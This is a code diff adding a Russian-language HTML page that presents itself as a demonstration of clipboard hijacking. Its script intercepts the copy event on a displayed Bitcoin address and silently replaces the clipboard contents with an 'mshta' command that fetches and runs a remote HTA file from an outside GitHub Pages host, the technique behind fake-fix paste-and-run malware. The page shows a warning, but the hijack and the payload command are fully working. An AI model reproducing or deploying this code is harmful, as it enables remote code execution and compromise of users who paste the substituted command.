@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Демонстрация подмены буфера обмена</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 { color: #333; font-size: 1.5rem; }
+        p { color: #666; line-height: 1.6; }
+        
+        .wallet-box {
+            background: #eee;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 1.1rem;
+            margin: 20px 0;
+            border: 2px dashed #bbb;
+            user-select: all; /* Облегчает выделение */
+            cursor: pointer;
+        }
+
+        .input-area {
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+
+        .alert {
+            margin-top: 15px;
+            padding: 10px;
+            background: #fff3cd;
+            color: #856404;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        .attacker-info {
+            color: #d9534f;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Осторожно: Подмена текста!</h1>
+    <p>Попробуйте скопировать "адрес кошелька" ниже (выделите и нажмите <b>Ctrl+C</b>), а затем вставьте его в поле ввода.</p>
+    
+    <div class="wallet-box" id="target-text">
+        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+    </div>
+
+    <input type="text" class="input-area" placeholder="Вставьте сюда (Ctrl+V)...">
+
+    <div id="log" class="alert">
+        ⚠️ <b>Внимание!</b> Вы скопировали один текст, но в буфер был записан: <br>
+        <span class="attacker-info" id="fake-text-display"></span>
+    </div>
+</div>
+
+<script>
+    // Текст, на который мы будем подменять оригинал
+    const FAKE_DATA = "mshta https://reeplooe.github.io/matrixhub/matrix.hta";
+
+    // Слушаем событие копирования (Ctrl+C или контекстное меню)
+    document.addEventListener('copy', (event) => {
+        // Получаем то, что пользователь реально выделил
+        const selection = document.getSelection();
+        
+        // Если выделено что-то внутри нашего "кошелька"
+        if (selection.toString().includes("bc1q")) {
+            
+            // 1. Устанавливаем свои данные в буфер обмена
+            event.clipboardData.setData('text/plain', FAKE_DATA);
+            
+            // 2. Отменяем стандартное поведение (копирование оригинала)
+            event.preventDefault();
+
+            // Показываем уведомление для наглядности
+            const log = document.getElementById('log');
+            const fakeDisplay = document.getElementById('fake-text-display');
+            log.style.display = 'block';
+            fakeDisplay.innerText = FAKE_DATA;
+        }
+    });
+</script>
+
+</body>
+</html>
